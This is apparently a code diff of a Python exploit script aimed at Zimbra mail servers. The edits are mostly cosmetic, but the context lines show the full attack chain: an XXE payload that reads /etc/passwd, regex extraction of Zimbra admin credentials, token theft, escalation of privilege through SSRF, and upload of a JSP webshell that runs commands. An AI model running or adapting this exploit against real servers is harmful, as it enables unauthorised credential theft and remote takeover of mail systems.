@@ -14,8 +14,8 @@ import sys
 def connect(url: str) -> None:
     " Basic connect function "
 
-    response = get(url, **props)
-    body: str = response.text
+    response: str = get(url, **props)
+    body: str     = response.text
 
     if not response.ok:
         print(f"[red]> Error when connecting to {url}")
@@ -29,7 +29,7 @@ def host_is_alive(args) -> None:
     print(f"[green]> Connected sucessfully with host: {args.url}[/]")
     
     xml_file_path: str = f"{args.url}Autodiscover/Autodiscover.xml"
-    xml_request = get(xml_file_path, **props)
+    xml_request: str   = get(xml_file_path, **props)
 
     print(f"[red]> Error when trying to access {xml_file_path}") if not xml_request.ok else read_passwd(xml_file_path, args)
 
@@ -38,12 +38,15 @@ def read_passwd(xml_file_path, args) -> None:
     " Read /etc/passwd with XXE vulnerability "
 
     if(args.kc):
-        auth = args.kc
-        auth = auth.split(":")
+        auth     = args.kc
+        auth     = auth.split(":")
         username = auth[0]
         password = auth[1]
-        print(f"[yellow]> Using credentials: [b]{username}:{password}[/] [/]\n")
+
+        print(f"[yellow]> Credentials to be used: [b]{username}:{password}[/] [/]\n")
         get_low_priv_token(username, password, args)
+
+
 
     passwd_payload: Literal = """
 <!DOCTYPE xxe [
@@ -68,14 +71,14 @@ def read_passwd(xml_file_path, args) -> None:
         'headers': xxe_headers
     }
 
-    passwd_request = post(xml_file_path, **xxe_props)
-    passwd_response = passwd_request.text
+    passwd_request: str  = post(xml_file_path, **xxe_props)
+    passwd_response: str = passwd_request.text
 
     if '/bin/bash' in passwd_response:
         print("[green]> Zimbra vulnerable to XXE, collecting admin credentials[/]")
         get_credentials(xml_file_path, args)
     else:
-        return print("[red]> Zimbra not vulnerable to XXE, stopping[/]")
+        return print(f"[red]> {args.url} not vulnerable to XXE[/]")
 
 
 def get_credentials(xml_file_path, args) -> None:
@@ -108,7 +111,7 @@ def get_credentials(xml_file_path, args) -> None:
         'headers': xxe_headers
     }
 
-    credentials_request = post(xml_file_path, **xxe_props)
+    credentials_request: str  = post(xml_file_path, **xxe_props)
     credentials_response: str = credentials_request.text
 
     re_username = compile(r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
@@ -158,8 +161,8 @@ def get_low_priv_token(username, password, args) -> None:
         'headers': auth_headers
     }
 
-    auth_request = post(soap_url, **auth_props)
-    auth_response = auth_request.text
+    auth_request: str  = post(soap_url, **auth_props)
+    auth_response: str = auth_request.text
 
     rgx_auth_token = compile(r"<authToken>(.*?)</authToken>")
     auth_token = rgx_auth_token.findall(auth_response)[0]
@@ -205,8 +208,8 @@ def get_high_priv_token(username, password, auth_token, rgx_auth_token, args) ->
         'headers': high_priv_headers
     }
 
-    high_priv_request = post(ssrf_url, data=high_priv_auth, **high_priv_props)
-    high_priv_response = high_priv_request.text
+    high_priv_request: str  = post(ssrf_url, data=high_priv_auth, **high_priv_props)
+    high_priv_response: str = high_priv_request.text
 
     high_priv_token = rgx_auth_token.findall(high_priv_response)[0]
     size_token: int = len(high_priv_token)
@@ -259,7 +262,7 @@ if (request.getParameter("cmd") != null) {
     """
 
     upload_path: str = f"{args.url}service/extension/clientUploader/upload"
-    shell_path: str = f"{args.url}downloads/index.jsp"
+    shell_path: str  = f"{args.url}downloads/index.jsp"
 
     print(f"[yellow]> Uploading webshell in {shell_path}")
 
@@ -285,8 +288,8 @@ if (request.getParameter("cmd") != null) {
         "40000001": "[red]> Webshell upload failure: Have no permission to upload client software. [/]",
     }
 
-    upload_request = post(upload_path, files=upload_settings, headers=upload_headers, verify=False)
-    upload_response = upload_request.text
+    upload_request: str  = post(upload_path, files=upload_settings, headers=upload_headers, verify=False)
+    upload_response: str = upload_request.text
 
     for error, desc in errors_list.items():
         if error in upload_response:
